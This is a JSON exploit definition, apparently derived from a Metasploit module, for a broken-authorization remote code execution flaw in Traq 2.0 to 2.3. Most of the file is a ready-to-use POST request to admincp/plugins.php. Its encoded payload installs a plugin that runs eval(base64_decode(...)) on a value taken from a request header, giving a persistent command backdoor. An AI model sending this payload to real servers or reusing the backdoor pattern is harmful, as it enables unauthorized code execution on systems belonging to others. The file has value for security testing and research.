{
   "description" : "\n\n        This module exploits an arbitrary command execution vulnerability in\n\n        Traq 2.0 to 2.3. It's in the admincp/common.php script.\n\n\n\n        This function is called in each script located in the /admicp/ directory to\n\n        make sure the user has admin rights. This is a broken authorization schema\n\n        because the header() function doesn't stop the execution flow.\n\n        This can be exploited by malicious users to execute admin functionality,\n\n        e.g. execution of arbitrary PHP code leveraging of plugins.php functionality.\n\n      ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "platform" : "MULTI",
   "title" : "Traq admincp/common.php Remote Code Execution",
   "references" : [
      "http://traqproject.org/"
   ],
   "msf_module" : "traq_plugin_exec",
   "name" : "TraqPluginExec",
   "osvdb" : 77556,
   "informations" : {
      "REFERENCES" : [
         "http://traqproject.org/"
      ],
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "MSF_MODULE" : "traq_plugin_exec",
      "TITLE" : "Traq admincp/common.php Remote Code Execution",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #1 Request : [POST] /admincp/plugins.php",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "plugin_id=1&title=1&execorder=0&hook=template_footer&code=error_reporting%280%29%3beval%28base64_decode%28%24_SERVER%5bHTTP_CMD%5d%29%29%3bdie%3b",
            "METHOD" : "POST",
            "PATH" : "admincp/plugins.php"
         }
      },
      "name" : "TraqPluginExec",
      "OSVDB" : 77556,
      "DESCRIPTION" : "\n\n        This module exploits an arbitrary command execution vulnerability in\n\n        Traq 2.0 to 2.3. It's in the admincp/common.php script.\n\n\n\n        This function is called in each script located in the /admicp/ directory to\n\n        make sure the user has admin rights. This is a broken authorization schema\n\n        because the header() function doesn't stop the execution flow.\n\n        This can be exploited by malicious users to execute admin functionality,\n\n        e.g. execution of arbitrary PHP code leveraging of plugins.php functionality.\n\n      "
   },
   "detection" : {},
   "requests" : {
      "EXPLOIT1" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #1 Request : [POST] /admincp/plugins.php",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "plugin_id=1&title=1&execorder=0&hook=template_footer&code=error_reporting%280%29%3beval%28base64_decode%28%24_SERVER%5bHTTP_CMD%5d%29%29%3bdie%3b",
         "METHOD" : "POST",
         "PATH" : "admincp/plugins.php"
      }
   }
}
